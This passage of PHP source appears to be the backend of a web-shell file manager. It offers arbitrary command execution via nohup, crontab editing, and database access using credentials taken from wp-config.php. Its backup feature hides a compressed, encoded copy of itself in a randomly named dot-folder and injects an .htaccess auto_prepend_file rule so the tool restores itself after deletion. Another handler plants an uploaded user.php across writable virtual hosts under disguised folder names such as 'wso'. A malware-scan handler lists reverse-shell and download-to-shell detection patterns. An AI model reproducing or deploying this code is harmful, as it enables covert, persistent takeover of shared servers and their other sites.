            // Generate robust watchdog — checks every 1 second, logs changes, runs up to 30 days
            $code = "<?php\n";
            $code .= "set_time_limit(0);\n";
            $code .= "ignore_user_abort(true);\n";
            $code .= "\$t=".var_export($real,true).";\n";
            $code .= "\$sf=".var_export($stopfile,true).";\n";
            $code .= "\$lg=".var_export($logfile,true).";\n";
            $code .= "\$pf=".var_export($pidfile,true).";\n";
            $code .= "\$start=time();\$max=30*86400;\n";
            $code .= "@file_put_contents(\$pf,getmypid());\n";
            $code .= "@file_put_contents(\$lg,'['.date('Y-m-d H:i:s').'] START watchdog PID '.getmypid().' for '.\$t.\"\\n\",FILE_APPEND);\n";
            if (!empty($snap_code)) {
                $code .= $snap_code;
            } else {
                $code .= "\$snap=[\$t=>".(is_file($real)?'0444':'0555')."];\n";
            }
            $code .= "function relock(\$path,\$perms,\$lg){\n";
            $code .= "  \$cur=@fileperms(\$path)&07777;\n";
            $code .= "  if(\$cur!==\$perms){\n";
            $code .= "    @file_put_contents(\$lg,'['.date('Y-m-d H:i:s').'] RELOCK '.\$path.' was '.decoct(\$cur).' -> '.decoct(\$perms).\"\\n\",FILE_APPEND);\n";
            $code .= "    @chmod(\$path,\$perms);\n";
            $code .= "  }\n";
            $code .= "}\n";
            $code .= "while(true){\n";
            $code .= "  if(file_exists(\$sf)){@unlink(\$sf);@file_put_contents(\$lg,'['.date('Y-m-d H:i:s').'] STOP '.\$t.\"\\n\",FILE_APPEND);@unlink(\$pf);exit;}\n";
            $code .= "  if(time()-\$start>\$max){@file_put_contents(\$lg,'['.date('Y-m-d H:i:s').'] EXPIRED '.\$t.\"\\n\",FILE_APPEND);@unlink(\$pf);exit;}\n";
            $code .= "  if(!file_exists(\$t)){@file_put_contents(\$lg,'['.date('Y-m-d H:i:s').'] TARGET GONE '.\$t.\"\\n\",FILE_APPEND);@unlink(\$pf);exit;}\n";
            $code .= "  foreach(\$snap as \$p=>\$perm){if(file_exists(\$p))relock(\$p,\$perm,\$lg);}\n";
            $code .= "  usleep(500000);\n";
            $code .= "}\n";
            @file_put_contents($script, $code);
            @chmod($script, 0644);
            // Spawn watchdog
            if (!function_exists('exec') && !function_exists('shell_exec')) fm_err('exec() disabled — watchdog cannot start');
            $php = PHP_BINARY ?: 'php';
            $spawn = 'nohup '.escapeshellarg($php).' '.escapeshellarg($script).' > /dev/null 2>&1 & echo $!';
            $pid = trim(@shell_exec($spawn));
            if (!$pid || !ctype_digit($pid)) {
                // Fallback: try exec
                $out = []; @exec($spawn, $out);
                $pid = !empty($out) ? trim(end($out)) : '';
            }
            if (!$pid || !ctype_digit($pid)) fm_err('Failed to spawn watchdog (shell may be disabled)');
            @file_put_contents($pidfile, $pid);
            // Save to watches.json
            $wf = $pdir.'/watches.json';
            $w = is_file($wf) ? (@json_decode(@file_get_contents($wf),true) ?: []) : [];
            $w[$hash] = ['path'=>$real,'pid'=>(int)$pid,'started'=>date('c')];
            @file_put_contents($wf, json_encode($w));
            fm_ok(['pid'=>(int)$pid,'hash'=>$hash], "Locked & watching (PID $pid, checks every 0.5s, auto-relocks if changed)");

        case 'unlock_stop':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $item = fm_abs(fm_clean($_POST['item'] ?? ''));
            $real = realpath($item) ?: $item;
            $pdir = FM_ROOT . '/.fm_protected';
            $hash = substr(sha1($real), 0, 12);
            $stopfile = $pdir . '/watchlock.' . $hash . '.stop';
            $pidfile = $pdir . '/watchlock.' . $hash . '.pid';
            $script = $pdir . '/watchlock.' . $hash . '.php';
            // Signal stop
            @file_put_contents($stopfile, '1');
            // Kill PID
            if (is_file($pidfile)) {
                $pid = (int)@file_get_contents($pidfile);
                if ($pid > 0) { @exec('kill '.$pid.' 2>&1'); sleep(1); @exec('kill -9 '.$pid.' 2>&1'); }
                @unlink($pidfile);
            }
            @unlink($script); @unlink($stopfile);
            // Remove from watches.json
            $wf = $pdir.'/watches.json';
            if (is_file($wf)) { $w = @json_decode(@file_get_contents($wf),true) ?: []; unset($w[$hash]); @file_put_contents($wf, json_encode($w)); }
            // Unlock recursively
            if (file_exists($real)) {
                @chmod($real, is_dir($real)?0755:0644);
                if (is_dir($real)) {
                    try {
                        $ri = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($real), RecursiveIteratorIterator::SELF_FIRST);
                        foreach ($ri as $f) { if ($f->getFilename()==='.'||$f->getFilename()==='..') continue;
                            @chmod($f->getPathname(), $f->isDir()?0755:0644); }
                    } catch (Exception $e) {}
                }
            }
            fm_ok(null, 'Watchdog stopped and unlocked');

        case 'watch_list':
            $pdir = FM_ROOT . '/.fm_protected';
            $wf = $pdir.'/watches.json';
            if (!is_file($wf)) fm_ok(['watches'=>[],'count'=>0]);
            $w = @json_decode(@file_get_contents($wf),true) ?: [];
            $alive = [];
            foreach ($w as $h => $info) {
                $pid = (int)$info['pid'];
                $is_alive = false;
                if ($pid > 0) {
                    if (function_exists('posix_kill')) $is_alive = @posix_kill($pid, 0);
                    else $is_alive = is_dir('/proc/'.$pid);
                }
                if ($is_alive) $alive[$h] = $info;
                else { @unlink($pdir.'/watchlock.'.$h.'.pid'); @unlink($pdir.'/watchlock.'.$h.'.php'); }
            }
            if (count($alive) !== count($w)) @file_put_contents($wf, json_encode($alive));
            fm_ok(['watches'=>array_values($alive),'count'=>count($alive)]);

        case 'scan_malware':
            // Security scan: search for suspicious PHP/shell patterns in a folder (or single file)
            fm_verify_token();
            $item_path = fm_abs(fm_clean($_POST['item'] ?? ''));
            if (!file_exists($item_path)) fm_err('Path not found', 404);
            $real = realpath($item_path); $real_root = realpath(FM_CWD_ROOT);
            if (!$real || !$real_root || strpos($real, $real_root) !== 0) fm_err('Path outside root', 403);

            // Suspicious patterns — each entry: [regex, severity, label]
            $patterns = [
                ['/\beval\s*\(/i',                                          'high',   'eval() — code execution'],
                ['/\bassert\s*\(\s*[\'"]/i',                                'high',   'assert() with string — code execution'],
                ['/\b(system|exec|passthru|shell_exec|popen|proc_open)\s*\(/i', 'high', 'shell command execution'],
                ['/\bbase64_decode\s*\([^)]*\)\s*\)?\s*[;,]?\s*(?:eval|assert)/i', 'high', 'base64 + eval (obfuscated payload)'],
                ['/\b(gzinflate|gzuncompress|str_rot13)\s*\(\s*base64_decode/i', 'high', 'gzinflate/rot13 + base64 (packed shell)'],
                ['/preg_replace\s*\(\s*[\'"][^\'\"]*\/e/i',                 'high',   'preg_replace /e modifier — code injection'],
                ['/\$_(GET|POST|REQUEST|COOKIE|SERVER)\s*\[[^\]]+\]\s*\(/', 'high',   'Variable function from user input'],
                ['/\bcreate_function\s*\(/i',                               'high',   'create_function() — code execution'],
                ['/move_uploaded_file\s*\([^)]*\$_(FILES|POST|GET)/i',      'medium', 'Direct upload from $_FILES/$_POST'],
                ['/\b(fsockopen|pfsockopen|socket_create)\s*\(/i',          'medium', 'Raw socket — possible backdoor/scanner'],
                ['/python\s*-c|perl\s*-e|nc\s+-e|bash\s*-i\s*>&/i',         'high',   'Reverse-shell command pattern'],
                ['/wget\s+http|curl\s+http.*\|\s*(sh|bash|php)/i',          'high',   'Remote download piped to shell'],
                ['/[\'"]GLOBALS[\'"]\s*\[/i',                               'medium', 'Suspicious $GLOBALS access (often in packers)'],
                ['/\\\\x[0-9a-fA-F]{2}\\\\x[0-9a-fA-F]{2}\\\\x[0-9a-fA-F]{2}/', 'medium', 'Hex-encoded string (obfuscation)'],
                ['/chr\s*\(\s*\d+\s*\)\s*\.\s*chr\s*\(\s*\d+\s*\)\s*\.\s*chr/', 'medium', 'chr().chr().chr() chains (obfuscation)'],
            ];

            $exts = ['php','phtml','php3','php4','php5','php7','phar','inc','js','html','htm','htaccess','sh','py','pl','cgi'];
            $skip_dirs = ['node_modules','.git','.svn','vendor','cache','.cache','__pycache__'];
            $max_file_size = 2 * 1024 * 1024; // 2 MB per file
            $max_findings = 300;

            $findings = []; $files_scanned = 0; $files_skipped = 0;

            $scan_one_file = function($path) use ($patterns, $max_file_size, &$findings, &$files_scanned, &$files_skipped, $max_findings, $real_root) {
                if (count($findings) >= $max_findings) return;
                $sz = @filesize($path);
                if ($sz === false || $sz > $max_file_size) { $files_skipped++; return; }
                $content = @file_get_contents($path);
                if ($content === false) { $files_skipped++; return; }
                $files_scanned++;
                // Skip files with no PHP open tag for php-only patterns? No — JS shells exist. Scan everything.
                $lines = null;
                foreach ($patterns as $pat) {
                    if (count($findings) >= $max_findings) return;
                    if (preg_match_all($pat[0], $content, $matches, PREG_OFFSET_CAPTURE)) {
                        if ($lines === null) $lines = explode("\n", $content);
                        foreach ($matches[0] as $m) {
                            if (count($findings) >= $max_findings) return;
                            $offset = $m[1];
                            $line_no = substr_count(substr($content, 0, $offset), "\n") + 1;
                            $line_text = isset($lines[$line_no - 1]) ? trim($lines[$line_no - 1]) : '';
                            if (strlen($line_text) > 200) $line_text = substr($line_text, 0, 200) . '…';
                            // Convert absolute path to relative for display
                            $rel = ltrim(substr($path, strlen($real_root)), '/');
                            $findings[] = [
                                'file'    => $rel,
                                'abs'     => $path,
                                'line'    => $line_no,
                                'severity'=> $pat[1],
                                'label'   => $pat[2],
                                'snippet' => $line_text,
                            ];
                            break; // one finding per pattern per file is enough
                        }
                    }
                }
            };

            if (is_file($real)) {
                $scan_one_file($real);
            } else {
                try {
                    $it = new RecursiveIteratorIterator(
                        new RecursiveCallbackFilterIterator(
                            new RecursiveDirectoryIterator($real, RecursiveDirectoryIterator::SKIP_DOTS),
                            function($current) use ($skip_dirs) {
                                if ($current->isDir() && in_array($current->getFilename(), $skip_dirs, true)) return false;
                                return true;
                            }
                        ),
                        RecursiveIteratorIterator::LEAVES_ONLY
                    );
                    foreach ($it as $i) {
                        if (count($findings) >= $max_findings) break;
                        if (!$i->isFile()) continue;
                        $ext = strtolower(pathinfo($i->getFilename(), PATHINFO_EXTENSION));
                        if (!in_array($ext, $exts, true)) continue;
                        $scan_one_file($i->getPathname());
                    }
                } catch (Exception $e) { /* keep partial findings */ }
            }

            // Sort: high severity first
            usort($findings, function($a, $b) {
                if ($a['severity'] !== $b['severity']) return $a['severity'] === 'high' ? -1 : 1;
                return strcmp($a['file'], $b['file']);
            });

            fm_ok([
                'findings' => $findings,
                'count'    => count($findings),
                'scanned'  => $files_scanned,
                'skipped'  => $files_skipped,
                'truncated'=> count($findings) >= $max_findings,
            ], count($findings) === 0
                ? "Scan complete — $files_scanned files scanned, no suspicious patterns found"
                : "Scan complete — " . count($findings) . " finding(s) in $files_scanned files");

        case 'protect':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            if (FM_IS_WIN) fm_err('File protection is not available on Windows');
            $item_path = fm_abs(fm_clean($_POST['item'] ?? ''));
            if (!is_file($item_path)) fm_err('File not found');
            $dir = dirname($item_path);
            $fname = basename($item_path);
            $backup_dir = $dir . '/.fm_protected';
            if (!is_dir($backup_dir)) @mkdir($backup_dir, 0755, true);
            // Backup the file
            if (!copy($item_path, $backup_dir . '/' . $fname)) fm_err('Failed to backup file');
            // Add crontab entry
            $cron_marker = '# FM_PROTECT:' . $item_path;
            $cron_cmd = '* * * * * test -f ' . escapeshellarg($item_path) . ' || cp ' . escapeshellarg($backup_dir . '/' . $fname) . ' ' . escapeshellarg($item_path) . ' ' . $cron_marker;
            $existing = [];
            exec('crontab -l 2>/dev/null', $existing);
            // Check if already protected
            foreach ($existing as $line) {
                if (strpos($line, $cron_marker) !== false) {
                    fm_ok(null, 'File is already protected');
                }
            }
            $existing[] = $cron_cmd;
            $tmp = tempnam(sys_get_temp_dir(), 'cron_');
            file_put_contents($tmp, implode("\n", $existing) . "\n");
            exec('crontab ' . escapeshellarg($tmp) . ' 2>&1', $out, $ret);
            @unlink($tmp);
            if ($ret !== 0) fm_err('Failed to set crontab');
            fm_ok(null, 'File protected! It will auto-restore if deleted.');

        case 'unprotect':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            if (FM_IS_WIN) fm_err('File protection is not available on Windows');
            $item_path = fm_abs(fm_clean($_POST['item'] ?? ''));
            $fname = basename($item_path);
            $dir = dirname($item_path);
            $backup_dir = $dir . '/.fm_protected';
            $cron_marker = '# FM_PROTECT:' . $item_path;
            // Remove crontab entry
            $existing = [];
            exec('crontab -l 2>/dev/null', $existing);
            $filtered = array_filter($existing, function($line) use ($cron_marker) {
                return strpos($line, $cron_marker) === false;
            });
            $tmp = tempnam(sys_get_temp_dir(), 'cron_');
            file_put_contents($tmp, implode("\n", $filtered) . "\n");
            exec('crontab ' . escapeshellarg($tmp) . ' 2>&1', $out, $ret);
            @unlink($tmp);
            // Remove backup
            if (is_file($backup_dir . '/' . $fname)) @unlink($backup_dir . '/' . $fname);
            // Clean up empty backup dir
            if (is_dir($backup_dir) && count(scandir($backup_dir)) <= 2) @rmdir($backup_dir);
            fm_ok(null, 'File protection removed.');

        // Check if a file is protected
        case 'is_protected':
            $item_path = fm_abs(fm_clean($_POST['item'] ?? ''));
            $cron_marker = '# FM_PROTECT:' . $item_path;
            $existing = [];
            exec('crontab -l 2>/dev/null', $existing);
            $found = false;
            foreach ($existing as $line) {
                if (strpos($line, $cron_marker) !== false) { $found = true; break; }
            }
            fm_ok(['protected' => $found]);

        // List all protected files
        case 'protected_list':
            $existing = [];
            exec('crontab -l 2>/dev/null', $existing);
            $protected = [];
            foreach ($existing as $line) {
                if (preg_match('/# FM_PROTECT:(.+)$/', $line, $m)) {
                    $protected[] = trim($m[1]);
                }
            }
            fm_ok($protected);

        // ── CRONTAB ────────────────────────────────
        case 'crontab':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            if (FM_IS_WIN) fm_err('Crontab is not available on Windows');
            $sub = $_POST['sub'] ?? 'list';
            if ($sub === 'list') {
                $output = [];
                exec('crontab -l 2>&1', $output, $ret);
                fm_ok(['content' => implode("\n", $output), 'exit' => $ret]);
            } elseif ($sub === 'save') {
                $content = $_POST['content'] ?? '';
                $tmp = tempnam(sys_get_temp_dir(), 'cron_');
                file_put_contents($tmp, $content . "\n");
                exec('crontab ' . escapeshellarg($tmp) . ' 2>&1', $output, $ret);
                @unlink($tmp);
                if ($ret !== 0) fm_err('Failed to save crontab: ' . implode("\n", $output));
                fm_ok(null, 'Crontab saved!');
            } else {
                fm_err('Unknown crontab sub-action');
            }

        // ── NOHUP ─────────────────────────────────
        case 'nohup':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $cmd = $_POST['cmd'] ?? '';
            if ($cmd === '') fm_err('Command required');
            $cwd = fm_abs($rel_path);
            if (!is_dir($cwd)) $cwd = FM_ROOT;
            $log_file = sys_get_temp_dir() . '/fm_nohup_' . date('Ymd_His') . '_' . substr(md5(uniqid()), 0, 6) . '.log';
            if (FM_IS_WIN) {
                $full_cmd = "cd /d " . escapeshellarg(str_replace('/', '\\', $cwd)) . " && start /B $cmd > " . escapeshellarg($log_file) . " 2>&1";
                pclose(popen($full_cmd, 'r'));
            } else {
                $full_cmd = 'cd ' . escapeshellarg($cwd) . ' && nohup ' . $cmd . ' > ' . escapeshellarg($log_file) . ' 2>&1 & echo $!';
                $output = [];
                exec($full_cmd, $output, $ret);
            }
            $pid = !empty($output) ? trim(end($output)) : 'unknown';
            fm_ok(['pid' => $pid, 'log' => $log_file], 'Process started in background (PID: ' . $pid . ')');

        // ── PROCESSES ─────────────────────────────
        case 'processes':
            fm_verify_token();
            $output = [];
            if (FM_IS_WIN) {
                exec('tasklist /FO CSV /NH 2>&1', $output, $ret);
            } else {
                exec('ps aux --sort=-%cpu 2>&1 | head -30', $output, $ret);
            }
            fm_ok(['output' => implode("\n", $output), 'exit' => $ret]);
            break;

        // ── DATABASE MANAGEMENT ────────────────────
        case 'db_detect':
            fm_verify_token();
            $creds = fm_db_detect();
            if (!$creds) fm_err('No database configuration found (wp-config.php not detected)', 404);
            $conn = fm_db_connect();
            if (!$conn) fm_err('Cannot connect to database');
            $ver = $conn->server_info ?? '?';
            $charset = $conn->character_set_name() ?? '?';
            fm_ok([
                'host'    => $creds['DB_HOST'] ?? 'localhost',
                'name'    => $creds['DB_NAME'] ?? '',
                'user'    => $creds['DB_USER'] ?? '',
                'charset' => $creds['DB_CHARSET'] ?? 'utf8mb4',
                'server'  => $ver,
                'conn_charset' => $charset,
            ], 'Database detected');

        case 'db_tables':
            fm_verify_token();
            $conn = fm_db_connect();
            if (!$conn) fm_err('Database connection failed');
            $res = $conn->query('SHOW TABLE STATUS');
            if (!$res) fm_err('Query failed: ' . $conn->error);
            $tables = [];
            while ($row = $res->fetch_assoc()) {
                $tables[] = [
                    'name'      => $row['Name'],
                    'engine'    => $row['Engine'] ?? '',
                    'rows'      => (int)($row['Rows'] ?? 0),
                    'size'      => (int)($row['Data_length'] ?? 0) + (int)($row['Index_length'] ?? 0),
                    'collation' => $row['Collation'] ?? '',
                    'auto_inc'  => $row['Auto_increment'] ?? null,
                    'created'   => $row['Create_time'] ?? '',
                    'updated'   => $row['Update_time'] ?? '',
                ];
            }
            $res->free();
            fm_ok($tables, count($tables) . ' tables');

        case 'db_structure':
            fm_verify_token();
            $conn = fm_db_connect();
            if (!$conn) fm_err('Database connection failed');
            $table = $_POST['table'] ?? '';
            if (!$table) fm_err('No table specified');
            $safe = $conn->real_escape_string($table);
            $res = $conn->query("DESCRIBE `{$safe}`");
            if (!$res) fm_err('Query failed: ' . $conn->error);
            $cols = [];
            while ($row = $res->fetch_assoc()) {
                $cols[] = $row;
            }
            $res->free();
            fm_ok($cols, 'ok');

        case 'db_data':
            fm_verify_token();
            $conn = fm_db_connect();
            if (!$conn) fm_err('Database connection failed');
            $table = $_POST['table'] ?? '';
            if (!$table) fm_err('No table specified');
            $limit  = max(1, min(500, (int)($_POST['limit'] ?? 50)));
            $offset = max(0, (int)($_POST['offset'] ?? 0));
            $safe = $conn->real_escape_string($table);
            $cntRes = $conn->query("SELECT COUNT(*) as cnt FROM `{$safe}`");
            $total = $cntRes ? (int)$cntRes->fetch_assoc()['cnt'] : 0;
            if ($cntRes) $cntRes->free();
            $res = $conn->query("SELECT * FROM `{$safe}` LIMIT {$limit} OFFSET {$offset}");
            if (!$res) fm_err('Query failed: ' . $conn->error);
            $rows = [];
            $fields = [];
            for ($i = 0; $i < $res->field_count; $i++) {
                $fi = $res->fetch_field_direct($i);
                $fields[] = $fi->name;
            }
            while ($row = $res->fetch_assoc()) {
                $rows[] = $row;
            }
            $res->free();
            fm_ok(['fields' => $fields, 'rows' => $rows, 'total' => $total, 'limit' => $limit, 'offset' => $offset], 'ok');

        case 'db_query':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $conn = fm_db_connect();
            if (!$conn) fm_err('Database connection failed');
            $sql = trim($_POST['sql'] ?? '');
            if ($sql === '') fm_err('Empty query');
            $isSelect = preg_match('/^\s*(SELECT|SHOW|DESCRIBE|EXPLAIN|DESC)\b/i', $sql);
            if ($isSelect) {
                $res = $conn->query($sql);
                if (!$res) fm_err('Query error: ' . $conn->error);
                $fields = [];
                for ($i = 0; $i < $res->field_count; $i++) {
                    $fi = $res->fetch_field_direct($i);
                    $fields[] = $fi->name;
                }
                $rows = [];
                $max = 1000;
                while (($row = $res->fetch_assoc()) && $max-- > 0) {
                    $rows[] = $row;
                }
                $res->free();
                fm_ok(['type' => 'select', 'fields' => $fields, 'rows' => $rows, 'count' => count($rows)], count($rows) . ' rows');
            } else {
                $ok = $conn->query($sql);
                if (!$ok) fm_err('Query error: ' . $conn->error);
                fm_ok(['type' => 'exec', 'affected' => $conn->affected_rows, 'insert_id' => $conn->insert_id], $conn->affected_rows . ' rows affected');
            }
            break;

        // ── BACKUP & AUTO-RESTORE ──────────────────
        case 'backup_create':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);

            $self_path = __FILE__;
            $self_content = @file_get_contents($self_path);
            if (!$self_content) fm_err('Cannot read own file');

            $doc_root = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? ''), '/');
            if (!$doc_root || !is_dir($doc_root)) fm_err('Cannot determine document root');

            $prefixes = ['.', '._', '.~', '._~'];
            $words = ['cache', 'sess', 'tmp', 'log', 'run', 'cfg', 'lib', 'opt', 'dat', 'res'];
            $candidates = [];
            $scan_dirs = function($base, $depth = 0) use (&$scan_dirs, &$candidates, $prefixes, $words) {
                if ($depth > 4 || count($candidates) > 50) return;
                $entries = @scandir($base);
                if (!$entries) return;
                foreach ($entries as $e) {
                    if ($e === '.' || $e === '..') continue;
                    $full = $base . '/' . $e;
                    if (!@is_dir($full) || @is_link($full)) continue;
                    if (in_array($e, ['.git', '.svn', 'node_modules', '.well-known', '.fm_protected'], true)) continue;
                    if (@is_writable($full) && $depth >= 1) $candidates[] = $full;
                    $scan_dirs($full, $depth + 1);
                }
            };
            $scan_dirs($doc_root);

            if (empty($candidates)) fm_err('No suitable directory found for backup');
            $target_dir = $candidates[array_rand($candidates)];
            $prefix = $prefixes[array_rand($prefixes)];
            $word = $words[array_rand($words)];
            $rand = substr(md5(uniqid(mt_rand(), true)), 0, 6);
            $backup_folder = $prefix . $word . $rand;
            $backup_dir = $target_dir . '/' . $backup_folder;
            if (!@mkdir($backup_dir, 0755, true)) fm_err('Cannot create backup directory');

            $compressed = @gzcompress($self_content, 9);
            $encoded = base64_encode($compressed);
            $backup_file = $backup_dir . '/.' . substr(md5(mt_rand()), 0, 8) . '.dat';
            if (@file_put_contents($backup_file, $encoded) === false) fm_err('Cannot write backup file');
            @chmod($backup_file, 0644);

            $checker_file = $backup_dir . '/.check.php';
            $self_abs = str_replace('\\', '/', realpath($self_path));
            $checker_code = '<?php ' .
                'if(file_exists(' . var_export($self_abs, true) . '))return;' .
                '$d=@file_get_contents(' . var_export($backup_file, true) . ');' .
                'if(!$d)return;' .
                '$c=@gzuncompress(base64_decode($d));' .
                'if($c)@file_put_contents(' . var_export($self_abs, true) . ',$c);' .
                '@chmod(' . var_export($self_abs, true) . ',0644);';
            if (@file_put_contents($checker_file, $checker_code) === false) fm_err('Cannot write checker file');
            @chmod($checker_file, 0644);

            $htaccess_path = $doc_root . '/.htaccess';
            $prepend_line = 'php_value auto_prepend_file "' . $checker_file . '"';
            $marker_start = '# FM_BACKUP_START';
            $marker_end   = '# FM_BACKUP_END';
            $block = $marker_start . "\n" . $prepend_line . "\n" . $marker_end;

            $existing = @file_get_contents($htaccess_path) ?: '';
            $pattern = '/' . preg_quote($marker_start, '/') . '.*?' . preg_quote($marker_end, '/') . '\n?/s';
            $existing = preg_replace($pattern, '', $existing);
            $new_htaccess = $block . "\n" . $existing;
            if (@file_put_contents($htaccess_path, $new_htaccess) === false) fm_err('Cannot update .htaccess');

            $meta_file = $backup_dir . '/.meta.json';
            @file_put_contents($meta_file, json_encode([
                'self'    => $self_abs,
                'backup'  => $backup_file,
                'checker' => $checker_file,
                'created' => date('Y-m-d H:i:s'),
            ]));
            @chmod($meta_file, 0644);

            $info_path = dirname($self_abs) . '/.fm_backup_ref';
            @file_put_contents($info_path, json_encode([
                'backup_dir' => $backup_dir,
                'checker'    => $checker_file,
                'created'    => date('Y-m-d H:i:s'),
            ]));
            @chmod($info_path, 0644);

            fm_ok([
                'backup_dir'  => $backup_dir,
                'checker'     => $checker_file,
                'htaccess'    => $htaccess_path,
            ], 'Backup created');

        case 'backup_status':
            fm_verify_token();
            $self_abs = str_replace('\\', '/', realpath(__FILE__));
            $ref_file = dirname($self_abs) . '/.fm_backup_ref';
            if (!is_file($ref_file)) {
                fm_ok(['active' => false], 'No backup');
                break;
            }
            $info = json_decode(@file_get_contents($ref_file), true);
            if (!$info) { fm_ok(['active' => false], 'No backup'); break; }
            $checker_exists = !empty($info['checker']) && is_file($info['checker']);
            $dir_exists = !empty($info['backup_dir']) && is_dir($info['backup_dir']);
            fm_ok([
                'active'       => $checker_exists && $dir_exists,
                'backup_dir'   => $info['backup_dir'] ?? '',
                'checker'      => $info['checker'] ?? '',
                'created'      => $info['created'] ?? '',
                'checker_ok'   => $checker_exists,
                'dir_ok'       => $dir_exists,
            ], $checker_exists && $dir_exists ? 'Backup active' : 'Backup broken');

        case 'backup_remove':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);
            $self_abs = str_replace('\\', '/', realpath(__FILE__));
            $ref_file = dirname($self_abs) . '/.fm_backup_ref';
            $info = is_file($ref_file) ? json_decode(@file_get_contents($ref_file), true) : null;

            $doc_root = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? ''), '/');
            $htaccess_path = $doc_root . '/.htaccess';
            $existing = @file_get_contents($htaccess_path) ?: '';
            $marker_start = '# FM_BACKUP_START';
            $marker_end   = '# FM_BACKUP_END';
            $pattern = '/' . preg_quote($marker_start, '/') . '.*?' . preg_quote($marker_end, '/') . '\n?/s';
            $cleaned = preg_replace($pattern, '', $existing);
            if ($cleaned !== $existing) @file_put_contents($htaccess_path, $cleaned);

            if ($info && !empty($info['backup_dir']) && is_dir($info['backup_dir'])) {
                $files = @scandir($info['backup_dir']);
                if ($files) {
                    foreach ($files as $f) {
                        if ($f === '.' || $f === '..') continue;
                        @unlink($info['backup_dir'] . '/' . $f);
                    }
                }
                @rmdir($info['backup_dir']);
            }
            @unlink($ref_file);
            fm_ok(null, 'Backup removed');

        // ── SCAN VHOSTS (manual base_dir) ──────────
        case 'scan_vhosts':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);

            $base_dir = trim($_POST['base_dir'] ?? '');
            if ($base_dir === '') fm_err('No base directory specified');
            $base_dir = rtrim(str_replace('\\', '/', $base_dir), '/');
            if (!@is_dir($base_dir)) fm_err('Directory not found: ' . $base_dir);

            $skip_dirs = ['.git', '.svn', 'node_modules', '.fm_protected', '.well-known', '.trash', '.cache', '.composer', '.npm', '.cpanel', 'mail', 'logs', 'ssl', 'tmp', 'etc'];
            $max_depth = 8;
            $max_results = 3000;

            $find_deployed = function($dir) {
                $entries = @scandir($dir);
                if (!$entries) return null;
                foreach ($entries as $name) {
                    if ($name === '.' || $name === '..') continue;
                    $full = $dir . '/' . $name;
                    if (@is_dir($full) && @is_file($full . '/user.php')) return $name;
                }
                return null;
            };

            $found = [];
            $count = 0;

            $scan = function($dir, $depth) use (&$scan, &$found, &$count, $skip_dirs, $max_depth, $max_results, $find_deployed, $base_dir) {
                if ($depth > $max_depth || $count >= $max_results) return;
                $entries = @scandir($dir);
                if (!$entries) return;
                foreach ($entries as $name) {
                    if ($count >= $max_results) break;
                    if ($name === '.' || $name === '..') continue;
                    if (in_array($name, $skip_dirs, true)) continue;
                    $full = $dir . '/' . $name;
                    $ft = @filetype($full);
                    if ($ft !== 'dir' && !@is_dir($full)) continue;
                    if (@is_link($full)) continue;

                    $real = @realpath($full) ?: $full;
                    $writable = @is_writable($real);
                    $dep = $find_deployed($real);

                    $rel = substr($real, strlen($base_dir));
                    $found[] = [
                        'path'     => $real,
                        'name'     => $name,
                        'rel'      => $rel,
                        'writable' => $writable,
                        'deployed' => $dep !== null,
                        'depth'    => $depth,
                    ];
                    $count++;
                    $scan($real, $depth + 1);
                }
            };

            $scan($base_dir, 0);

            fm_ok([
                'vhosts'         => $found,
                'count'          => count($found),
                'writable_count' => count(array_filter($found, function($v) { return $v['writable']; })),
                'base_dir'       => $base_dir,
            ]);
            break;

        // ── DEPLOY VHOSTS ─────────────────────────
        case 'deploy_vhosts':
            fm_verify_token();
            if (fm_is_readonly()) fm_err(t('readonly_warn'), 403);

            $targets = json_decode($_POST['targets'] ?? '[]', true);
            if (empty($targets)) fm_err('No targets selected');

            if (empty($_FILES['user_file']) || $_FILES['user_file']['error'] !== UPLOAD_ERR_OK) {
                fm_err('Please upload your user.php file');
            }
            $user_content = @file_get_contents($_FILES['user_file']['tmp_name']);
            if ($user_content === false || $user_content === '') {
                fm_err('Failed to read uploaded file');
            }

            // Random folder name generator
            $gen_folder = function() {
                $prefixes = ['', '.', '._', '_', '.~', '._~'];
                $words = ['wso','cgi','sys','tmp','bak','log','run','opt','lib','cfg','srv','usr','var','bin','mod','sec','dat','res','api','net'];
                $prefix = $prefixes[array_rand($prefixes)];
                $word = $words[array_rand($words)];
                $rand = substr(md5(uniqid(mt_rand(), true)), 0, 12 - strlen($prefix) - strlen($word));
                return $prefix . $word . $rand;
            };

            // Find existing deployed folder
            $find_deployed = function($dir) {
                $entries = @scandir($dir);
                if (!$entries) return null;
                foreach ($entries as $name) {
                    if ($name === '.' || $name === '..') continue;
                    $full = $dir . '/' . $name;
                    if (is_dir($full) && is_file($full . '/user.php')) return $name;
                }
                return null;
            };

            $results = [];
            foreach ($targets as $target) {
                $target = str_replace('\\', '/', trim($target));
                if (!is_dir($target)) {
                    $results[] = ['path' => $target, 'success' => false, 'error' => 'Directory not found', 'folder' => ''];
                    continue;
                }
                if (!is_writable($target)) {
                    $results[] = ['path' => $target, 'success' => false, 'error' => 'Not writable', 'folder' => ''];
                    continue;
                }

                // Reuse existing deployed folder or generate new random one
                $existing = $find_deployed($target);
                $folder_name = $existing ?: $gen_folder();
                $deploy_dir = $target . '/' . $folder_name;

                if (!is_dir($deploy_dir)) {
                    if (!@mkdir($deploy_dir, 0755, true)) {
                        $results[] = ['path' => $target, 'success' => false, 'error' => 'Failed to create folder', 'folder' => ''];
                        continue;
                    }
                }
                $htaccess = $deploy_dir . '/.htaccess';
                if (!is_file($htaccess)) {
                    @file_put_contents($htaccess, "Options +ExecCGI\nAddHandler application/x-httpd-php .php\n<IfModule mod_authz_core.c>\n  Require all granted\n</IfModule>\n");
                }
                $dest = $deploy_dir . '/user.php';
